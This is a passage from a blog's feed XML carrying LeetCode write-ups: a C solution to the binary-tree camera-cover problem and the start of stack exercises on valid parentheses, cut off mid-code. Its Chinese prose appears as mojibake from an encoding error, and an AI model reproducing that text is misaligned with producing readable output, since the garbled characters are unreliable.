STATUS_CAMERA</strong></li><li><strong>å½“ä¸€ä¸ªç»“ç‚¹çš„å·¦å³å­æ ‘éƒ½å·²ç»è¢«æ‘„åƒå¤´è¦†ç›–ä¸Šæ—¶ï¼Œä¸ºäº†å®ç°æ‘„åƒå¤´æ•°é‡çš„æœ€å°åŒ–ï¼Œéœ€è¦åœ¨è¯¥ç»“ç‚¹çš„çˆ¶ç»“ç‚¹æ”¾ç½®æ‘„åƒå¤´ï¼Œå³åœ¨å›åˆ°çˆ¶ç»“ç‚¹å‰è¯¥ç»“ç‚¹éƒ½æ˜¯æœªè¢«è¦†ç›–çš„ï¼Œå®šä¹‰ä¸ºçŠ¶æ€ç STATUS_UNCOVERED</strong></li><li><strong>å½“ä¸€ä¸ªç»“ç‚¹çš„å·¦å³å­æ ‘ä¸­å­˜åœ¨æ‘„åƒå¤´ï¼Œåˆ™è¯¥ç»“ç‚¹è‚¯å®šæ˜¯è¢«è¦†ç›–äº†çš„ï¼Œå®šä¹‰ä¸ºçŠ¶æ€ç STATUS_COVERED</strong></li><li><strong>å¯¹äºç»“ç‚¹ä¸ºNULLçš„æƒ…å†µï¼Œæˆ‘ä»¬å¯ä»¥é»˜è®¤ä»–æ˜¯è¢«è¦†ç›–äº†çš„ç»“ç‚¹ï¼Œå³å®šä¹‰ä¸ºçŠ¶æ€ç STATUS_COVERED</strong></li></ul><p>åŒæ—¶ï¼Œ<strong>æˆ‘ä»¬è¿˜éœ€è¦å¯¹è¿™æ£µæ ‘çš„æ ¹èŠ‚ç‚¹åšä¸€æ¬¡å•ç‹¬çš„æ£€æµ‹ï¼Œä»¥ç¡®å®šæ˜¯å¦è¦åœ¨å…¶ä¸Šæ”¾ç½®æ‘„åƒå¤´</strong></p><p>ä¸ºäº†æ–¹ä¾¿åˆ¤å®šï¼Œæˆ‘ä»¬å°†STATUS_CAMERAè®¾ç½®ä¸ºçŠ¶æ€ç ä¸­å€¼ç›¸å¯¹å¤§çš„ä¸€ä¸ª</p><h4 id="çŠ¶æ€è½¬ç§»æ–¹ç¨‹-3"><a href="#çŠ¶æ€è½¬ç§»æ–¹ç¨‹-3" class="headerlink" title="çŠ¶æ€è½¬ç§»æ–¹ç¨‹"></a>çŠ¶æ€è½¬ç§»æ–¹ç¨‹</h4><p><strong>STATUS_ROOT &#x3D; F(STATUS_LEFT, STATUS_RIGHT)</strong></p><h4 id="æ—¶é—´å¤æ‚åº¦ï¼š"><a href="#æ—¶é—´å¤æ‚åº¦ï¼š" class="headerlink" title="æ—¶é—´å¤æ‚åº¦ï¼š"></a>æ—¶é—´å¤æ‚åº¦ï¼š</h4><p>næ¬¡éå†ï¼Œçº¿æ€§æ—¶é—´å¤æ‚åº¦<strong>O</strong>(<strong>N</strong>)</p><h4 id="ç©ºé—´å¤æ‚åº¦ï¼š"><a href="#ç©ºé—´å¤æ‚åº¦ï¼š" class="headerlink" title="ç©ºé—´å¤æ‚åº¦ï¼š"></a>ç©ºé—´å¤æ‚åº¦ï¼š</h4><p>é€’å½’ç®—æ³•è¦å¼€è¾Ÿnä¸ªæ ˆç©ºé—´ï¼Œæ•…ä¸ºçº¿æ€§ç©ºé—´å¤æ‚åº¦<strong>O</strong>(<strong>N</strong>)</p><p>æ„é€ ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for a binary tree node.</span></span><br><span class="line"><span class="comment"> * struct TreeNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     struct TreeNode *left;</span></span><br><span class="line"><span class="comment"> *     struct TreeNode *right;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * status code</span></span><br><span class="line"><span class="comment"> * 0: waiting for pwn</span></span><br><span class="line"><span class="comment"> * 1: has been pwn</span></span><br><span class="line"><span class="comment"> * 2: camara here</span></span><br><span class="line"><span class="comment"> *-1: inner error, just a placeholder in fact</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> STATUS_UNCOVERED 0</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> STATUS_COVERED 1</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> STATUS_CAMERA 2</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> STATUS_ERROR -1</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">minCameraCover</span><span class="params">(<span class="keyword">struct</span> TreeNode* root)</span> </span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> amounts=<span class="number">0</span>;<span class="comment">//amounts of camera</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">//add a camera to the root if status of root is 0</span></span><br><span class="line">    <span class="keyword">if</span>(dfs(root,&amp;amounts) == STATUS_UNCOVERED)</span><br><span class="line">        amounts++;</span><br><span class="line">    <span class="keyword">return</span> amounts;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">dfs</span><span class="params">(<span class="keyword">struct</span> TreeNode* root, <span class="type">int</span> * amounts)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//NULL pointer signed as status 1</span></span><br><span class="line">    <span class="keyword">if</span>(!root)</span><br><span class="line">        <span class="keyword">return</span> STATUS_COVERED;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//get the status of left and right node</span></span><br><span class="line">    <span class="type">int</span> left = dfs(root-&gt;left, amounts);</span><br><span class="line">    <span class="type">int</span> right = dfs(root-&gt;right, amounts);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//if one of both uncovered yet, a camera is needed</span></span><br><span class="line">    <span class="keyword">if</span>(left == STATUS_UNCOVERED || right == STATUS_UNCOVERED)</span><br><span class="line">    &#123;</span><br><span class="line">        (*amounts)++;</span><br><span class="line">        <span class="keyword">return</span> STATUS_CAMERA;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//if both are covered, father&#x27;s of root may need a camera</span></span><br><span class="line">    <span class="keyword">if</span>(left == STATUS_COVERED &amp;&amp; right == STATUS_COVERED)</span><br><span class="line">        <span class="keyword">return</span> STATUS_UNCOVERED;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//if there&#x27;s at least one camera in both childs, the root is covered</span></span><br><span class="line">    <span class="keyword">if</span>(left + right &gt; STATUS_CAMERA)</span><br><span class="line">        <span class="keyword">return</span> STATUS_COVERED;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//error code(not used)</span></span><br><span class="line">    <span class="keyword">return</span> STATUS_ERROR;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/09/22/64ytrK3gLNGowbf.png" alt="EE8895_CCLKZDA_OPW4_FT1.png"></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;0x00-ç»ªè®º&quot;&gt;&lt;a href=&quot;#0x00-ç»ªè®º&quot; class=&quot;headerlink&quot; title=&quot;0x00.ç»ªè®º&quot;&gt;&lt;/a&gt;0x00.ç»ªè®º&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;åŠ¨æ€è§„åˆ’&lt;/strong&gt;ï¼ˆ&lt;strong&gt;Dynamic Programming&lt;/strong&gt;ï¼‰æ˜¯ä¸€ç§é€šè¿‡æŠŠåŸé—®é¢˜åˆ†è§£ä¸ºç›¸å¯¹ç®€å•çš„å­é—®é¢˜çš„æ–¹å¼æ±‚è§£å¤æ‚é—®é¢˜çš„æ–¹æ³•ã€‚åŒæ—¶ä¹Ÿæ˜¯å„ç±»ä¿¡æ¯å­¦ç«èµ›ï¼ˆ Olympiad in Informatics ï¼‰ä¸­è¾ƒä¸ºå¸¸ç”¨çš„ç®—æ³•ä¹‹ä¸€ã€‚&lt;/p&gt;
&lt;p&gt;ä½œä¸ºå‰Â·è’Ÿè’»Â·OIerï¼Œå¯¹åŠ¨æ€è§„åˆ’ä¹Ÿæ˜¯ç¨å¾®äº†è§£ä¸€ç‚¹ç‚¹çš„XDï¼Œæ‰€ä»¥ç°åœ¨æ¥ç®€å•åˆ·ä¸€åˆ·leetcodeä¸ŠåŠ¨æ€è§„åˆ’çš„é¢˜Or2&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;æœ€åæ›´æ–°æ—¥æœŸ2020.9.7&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="Online Judge" scheme="http://archive.next.arttnba3.cn/categories/Online-Judge/"/>
    
    
    <category term="ç®—æ³•" scheme="http://archive.next.arttnba3.cn/tags/%E7%AE%97%E6%B3%95/"/>
    
    <category term="C/C++" scheme="http://archive.next.arttnba3.cn/tags/C-C/"/>
    
    <category term="é¢˜è§£" scheme="http://archive.next.arttnba3.cn/tags/%E9%A2%98%E8%A7%A3/"/>
    
    <category term="Leetcode" scheme="http://archive.next.arttnba3.cn/tags/Leetcode/"/>
    
    <category term="åŠ¨æ€è§„åˆ’" scheme="http://archive.next.arttnba3.cn/tags/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92/"/>
    
  </entry>
  
  <entry>
    <title>ã€OJ-0x0002-Leetcodeã€‘æ ˆéƒ¨åˆ†write up by arttnba3</title>
    <link href="http://archive.next.arttnba3.cn/2020/09/06/%E3%80%90OJ-0x0002-Leetcode%E3%80%91%E6%A0%88%E9%83%A8%E5%88%86write-up-by-arttnba3/"/>
    <id>http://archive.next.arttnba3.cn/2020/09/06/%E3%80%90OJ-0x0002-Leetcode%E3%80%91%E6%A0%88%E9%83%A8%E5%88%86write-up-by-arttnba3/</id>
    <published>2020-09-05T19:38:25.000Z</published>
    <updated>2020-09-25T17:38:04.091Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-ç»ªè®º"><a href="#0x00-ç»ªè®º" class="headerlink" title="0x00.ç»ªè®º"></a>0x00.ç»ªè®º</h1><p><strong>æ ˆ</strong>ï¼ˆ<strong>stack</strong>ï¼‰æ˜¯åœ¨ä»»ä½•çš„æ•°æ®ç»“æ„è¯¾æœ¬å½“ä¸­éƒ½ä¼šèŠ±ä¸€å®šç¯‡å¹…æ¥è®²è¿°çš„æ•°æ®ç»“æ„ä¹‹ä¸€ï¼Œä½œä¸ºä¸€ç§æŠ½è±¡æ•°æ®ç»“æ„ï¼Œæ— è®ºæ˜¯åœ¨ç®—æ³•åº”ç”¨ï¼ˆé€†æ³¢å…°è¡¨è¾¾å¼ç­‰ï¼‰ã€è®¡ç»„åŸç†ï¼ˆå‡½æ•°è°ƒç”¨æ ˆç­‰ï¼‰è¿˜æ˜¯åœ¨å®‰å…¨é¢†åŸŸï¼ˆæ ˆæº¢å‡ºç­‰ï¼‰éƒ½èƒ½è§åˆ°è¿™ä¸€æŠ½è±¡æ•°æ®ç»“æ„çš„èº«å½±ã€‚</p><p>ä¸Šä¸€ç¯‡å…³äºLeetcodeçš„åšæ–‡é‡Œæˆ‘ä»¬åˆ·äº†ç®€å•çº¿æ€§è¡¨â€”â€”å•å‘é“¾è¡¨çš„æœ‰å…³é¢˜ç›®ï¼Œé‚£ä¹ˆè¿™ä¸€æ¬¡æ¥åˆ·ä¸€åˆ·<strong>å—é™çº¿æ€§è¡¨</strong>â€”â€”æ ˆçš„æœ‰å…³é¢˜ç›®å­2333333.</p><blockquote><p>æ³¨ï¼šè¿™ä¸ªç»ªè®ºæ˜¯åœ¨åŠå¤œå†™çš„ï¼Œå¯èƒ½æˆ‘å…¶å®è¿˜æ²¡å¼€å§‹åšé¢˜ï¼Œå¦‚æœä½ çœ‹åˆ°æ–‡ç« å­—æ•°ä¸åˆ°ä¸€åƒå­—çš„è¯å¯ä»¥å…ˆğŸ¦„ä½ç­‰åç»­çš„æ›´æ–°XD</p><p>æ³¨2ï¼šå½“æ™šå›æ¥æ‰“è‡ªå·±è„¸ï¼Œå†™å®Œç»ªè®ºä¹‹åé©¬ä¸Šè‚äº†å‡ é“é¢˜23333</p><p>æ³¨3ï¼šå‡ºäºä¸€äº›å¥‡æ€ªçš„åŸå› ï¼Œæˆ‘ä¼šä¼˜å…ˆé€‰æ‹©é¢è¯•é¢˜</p><p>æ³¨4ï¼šç‚¹å‡»æ ‡é¢˜å¯ä»¥ç›´æ¥è¿›å…¥åŸé¢˜ç½‘å€</p></blockquote><blockquote><p>æœ€åæ›´æ–°æ—¥æœŸï¼š2020.9.6</p></blockquote><span id="more"></span><h2 id="pre-æ ˆçš„ç®€å•æ„é€ å½¢å¼"><a href="#pre-æ ˆçš„ç®€å•æ„é€ å½¢å¼" class="headerlink" title="pre.æ ˆçš„ç®€å•æ„é€ å½¢å¼"></a>pre.æ ˆçš„ç®€å•æ„é€ å½¢å¼</h2><p>æˆ‘ä»¬éƒ½çŸ¥é“æ ˆæ˜¯ä¸€ç§<strong>å—é™çº¿æ€§è¡¨â€”â€”åè¿›å…ˆå‡ºè¡¨</strong>ï¼ˆ<strong>Last In First Outï¼ŒLIFO</strong>ï¼‰ï¼Œæˆ‘ä»¬å¸¸å¸¸å–œæ¬¢ä½¿ç”¨<strong>â€œå°†ä¸€ä¸ªå…ƒç´ å‹å…¥æ ˆä¸­â€</strong>çš„è¯´æ³•ï¼Œåœ¨è¿™ä¸ªå—é™çº¿æ€§è¡¨ä¸­ï¼Œæœ€å…ˆè¿›å»çš„å…ƒç´ ä¼šè¢«å‹åœ¨æœ€ä¸‹å±‚ï¼Œåé¢è¿›æ¥çš„å…ƒç´ ä¼šä¸€å±‚ä¸€å±‚åœ°å †å èµ·æ¥ï¼Œè€Œä¸€ä¸ªå…ƒç´ è‹¥æ˜¯æƒ³è¦å‡ºå»ï¼Œåˆ™åªèƒ½â€œåŸè·¯è¿”å›â€ï¼šå…ˆè®©å‹åœ¨å®ƒä¸Šé¢çš„å…ƒç´ å…ˆé€ä¸€å‡ºå»åï¼Œè‡ªå·±æ‰èƒ½å‡ºå»ã€‚</p><p>æ ˆçš„æ„é€ å¤§æ¦‚å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š</p><p><img src="https://i.loli.net/2020/09/06/rN6QjEP5lBH4Cmk.png" alt="image.png"></p><p>åœ¨è¿™é‡Œæˆ‘ä»¬å¯ä»¥æ³¨æ„åˆ°ï¼Œæˆ‘ä»¬åœ¨è®¿é—®æ ˆæ—¶ï¼Œæ°¸è¿œåªèƒ½ç›´æ¥è®¿é—®æ ˆé¡¶å…ƒç´ ã€‚æˆ‘ä»¬å¯ä»¥è”æƒ³åˆ°åœ¨å†…å­˜ç®¡ç†ä¸­æˆ‘ä»¬çš„stack pointeræ˜¯æ°¸è¿œæŒ‡å‘æ ˆå¸§ï¼ˆstack frameï¼‰çš„æ ˆé¡¶çš„ã€‚ï¼ˆå¥½åƒæœ‰ç‚¹æ‰¯è¿œäº†XD</p><p>é€šå¸¸æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬å¯ä»¥é€‰æ‹©<strong>ä½¿ç”¨ä¸€ä¸ªæ•°ç»„æ¥æ¨¡æ‹Ÿä¸€ä¸ªæ ˆ</strong>ï¼Œå¹¶é…ä¸Šä¸€ä¸ªé…å¥—çš„æŒ‡å‘æ ˆé¡¶çš„æŒ‡é’ˆï¼Œè¿™ä¹Ÿæ˜¯æœ€ç®€å•çš„å®ç°ä¸€ä¸ªæ ˆçš„å½¢å¼ã€‚</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> stack[stack_size];</span><br><span class="line"><span class="type">int</span> top = <span class="number">-1</span>;</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬åŒæ ·æƒ³åˆ°ï¼Œä½œä¸ºä¸€ä¸ªå—é™çº¿æ€§è¡¨ï¼Œæˆ‘ä»¬å¯ä»¥<strong>ä½¿ç”¨ä¸€ä¸ªé“¾è¡¨ç»“æ„æ¥æ¨¡æ‹Ÿä¸€ä¸ªæ ˆ</strong>ï¼Œç›¸æ¯”äºæ•°ç»„ç»“æ„è€Œè¨€å…¶ä¼˜åŠ¿åœ¨äº<strong>é“¾è¡¨æ˜¯åŠ¨æ€çš„ï¼Œä¸éœ€è¦åƒæ•°ç»„é‚£æ ·æå‰é¢å¤–åœ°å ç”¨è¿‡å¤šçš„å†…å­˜ç©ºé—´</strong></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">stack</span>&#123;</span><br><span class="line">    <span class="type">int</span> value;</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">stack</span>* next;</span><br><span class="line">&#125;Stack;</span><br></pre></td></tr></table></figure><h1 id="0x01-éš¾åº¦ï¼šç®€å•"><a href="#0x01-éš¾åº¦ï¼šç®€å•" class="headerlink" title="0x01.éš¾åº¦ï¼šç®€å•"></a>0x01.éš¾åº¦ï¼šç®€å•</h1><h2 id="0x00-æœ‰æ•ˆçš„æ‹¬å·"><a href="#0x00-æœ‰æ•ˆçš„æ‹¬å·" class="headerlink" title="0x00.æœ‰æ•ˆçš„æ‹¬å·"></a>0x00.<a href="https://leetcode-cn.com/problems/valid-parentheses">æœ‰æ•ˆçš„æ‹¬å·</a></h2><blockquote><p>ç»™å®šä¸€ä¸ªåªåŒ…æ‹¬ â€˜(â€˜ï¼Œâ€™)â€™ï¼Œâ€™{â€˜ï¼Œâ€™}â€™ï¼Œâ€™[â€˜ï¼Œâ€™]â€™ çš„å­—ç¬¦ä¸²ï¼Œåˆ¤æ–­å­—ç¬¦ä¸²æ˜¯å¦æœ‰æ•ˆã€‚</p><p>æœ‰æ•ˆå­—ç¬¦ä¸²éœ€æ»¡è¶³ï¼š</p><p>1ã€å·¦æ‹¬å·å¿…é¡»ç”¨ç›¸åŒç±»å‹çš„å³æ‹¬å·é—­åˆã€‚<br>2ã€å·¦æ‹¬å·å¿…é¡»ä»¥æ­£ç¡®çš„é¡ºåºé—­åˆã€‚<br>æ³¨æ„ç©ºå­—ç¬¦ä¸²å¯è¢«è®¤ä¸ºæ˜¯æœ‰æ•ˆå­—ç¬¦ä¸²ã€‚</p><p>ç¤ºä¾‹ 1:</p><p>è¾“å…¥: â€œ()â€<br>è¾“å‡º: true<br>ç¤ºä¾‹ 2:</p><p>è¾“å…¥: â€œ()[]{}â€<br>è¾“å‡º: true<br>ç¤ºä¾‹ 3:</p><p>è¾“å…¥: â€œ(]â€<br>è¾“å‡º: false<br>ç¤ºä¾‹ 4:</p><p>è¾“å…¥: â€œ([)]â€<br>è¾“å‡º: false<br>ç¤ºä¾‹ 5:</p><p>è¾“å…¥: â€œ{[]}â€<br>è¾“å‡º: true</p><p>æ¥æºï¼šåŠ›æ‰£ï¼ˆLeetCodeï¼‰<br>é“¾æ¥ï¼š<a href="https://leetcode-cn.com/problems/valid-parentheses">https://leetcode-cn.com/problems/valid-parentheses</a><br>è‘—ä½œæƒå½’é¢†æ‰£ç½‘ç»œæ‰€æœ‰ã€‚å•†ä¸šè½¬è½½è¯·è”ç³»å®˜æ–¹æˆæƒï¼Œéå•†ä¸šè½¬è½½è¯·æ³¨æ˜å‡ºå¤„ã€‚</p></blockquote><p>åŸºæœ¬æ€è·¯ï¼š</p><ul><li><p>é€ä¸ªå­—ç¬¦è¿›è¡ŒåŒ¹é…</p></li><li><p><strong>é‡åˆ°å·¦æ‹¬å·ï¼šå…¥æ ˆ</strong></p></li><li><p><strong>é‡åˆ°å³æ‹¬å·ï¼šå·¦æ‹¬å·å‡ºæ ˆï¼Œä¸å³æ‹¬å·è¿›è¡ŒåŒ¹é…ï¼Œè‹¥æˆåŠŸåˆ™è¿›è¡Œä¸‹ä¸€è½®åŒ¹é…ï¼Œå¤±è´¥åˆ™è¿”å›false</strong></p></li></ul><p>ä¸ºäº†ä¿è¯ä¸æº¢å‡ºï¼Œæˆ‘ä»¬é¦–å…ˆé€‰æ‹©ä½¿ç”¨é“¾è¡¨æ„é€ æ ˆï¼Œä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">stack</span>&#123;</span><br><span class="line">    <span class="type">char</span> value;</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">stack</span>* next;</span><br><span class="line">&#125;Stack;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">isValid</span><span class="params">(<span class="type">char</span> * str)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(str == <span class="literal">NULL</span>||str[<span class="number">0</span>]==<span class="string">&#x27;\0&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    <span class="type">int</span> len = <span class="built_in">strlen</span>(str);</span><br><span class="line">    Stack *s = (Stack*)<span class="built_in">malloc</span>(<span class="built_in">sizeof</span>(Stack));</span><br><span class="line">    s-&gt;value = <span class="number">-1</span>;</span><br><span class="line">    s-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="type">char</span> ch;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;len;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        ch = str[i];</span><br><span class="line">        <span class="keyword">if</span>(ch == <span class="string">&#x27;(&#x27;</span>||ch == <span class="string">&#x27;[&#x27;</span>||ch==<span class="string">&#x27;&#123;&#x27;</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            Stack * temp = (Stack*)<span class="built_in">malloc</span>(<span class="built_in">sizeof</span>(Stack));</span><br><span class="line">            temp-&gt;value = ch;</span><br><span class="line">            temp-&gt;next = s;</span><br><span class="line">            s = temp;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(ch == <span class="string">&#x27;)&#x27;</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(s-&gt;value!=<span class="string">&#x27;(&#x27;</span>)</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            s = s-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(ch == <span class="string">&#x27;]&#x27;</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(s-&gt;value!=<span class="string">&#x27;[&#x27;</span>)</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            s = s-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(ch == <span class="string">&#x27;&#125;&#x27;</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(s-&gt;value!=<span class="string">&#x27;&#123;&#x27;</span>)</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            s = s-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(s-&gt;value!=<span class="number">-1</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/09/06/MrIq76Sm2ZnAETX.png" alt="image.png"></p><p>ç©ºé—´ä¸Šä¼¼ä¹ä¸å¤§è¡Œçš„æ ·å­ï¼Œå› ä¸ºä½¿ç”¨æ•°ç»„è‚¯å®šæ˜¯æ¯”ä½¿ç”¨é“¾è¡¨è¦å ç”¨æ›´å°‘çš„ç©ºé—´</p><p>ç”±äºå­—ç¬¦ä¸²çš„å¤§å°æ˜¯å¯çŸ¥çš„ï¼Œæ•…æˆ‘ä»¬å¯ä»¥ä½¿ç”¨åŠ¨æ€æ•°ç»„æ„é€ é“¾è¡¨ï¼Œä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">bool</span> <span class="title">isValid</span><span class="params">(<span class="type">char</span> * str)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(str == <span class="literal">NULL</span>||str[<span class="number">0</span>]==<span class="string">&#x27;\0&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    <span class="type">int</span> len = <span class="built_in">strlen</span>(str);</span><br><span class="line">    <span class="type">int</span> top = <span class="number">-1</span>;</span><br><span class="line">    <span class="type">char</span> * s = (<span class="type">char</span>*)<span class="built_in">malloc</span>(<span class="built_in">sizeof</span>(<span class="type">char</span>)*len+<span class="number">1</span>);<span class="comment">//prevent overflow</span></span><br><span class="line">    <span class="type">char</span> ch;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;len;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        ch = str[i];</span><br><span class="line">        <span class="keyword">if</span>(ch == <span class="string">&#x27;(&#x27;</span>||ch == <span class="string">&#x27;[&#x27;</span>||ch==<span class="string">&#x27;&#123;&#x27;</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            top++;</span><br><span class="line">            s[top] = ch;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(ch == <span class="string">&#x27;)&#x27;</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(top == <span class="number">-1</span>||s[top]!=<span class="string">&#x27;(&#x27;</span>)</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            top--;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(ch == <span class="string">&#x27;]&#x27;</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(top == <span class="number">-1</span>||s[top]!=<span class="string">&#x27;[&#x27;</span>)</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            top--;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(ch == 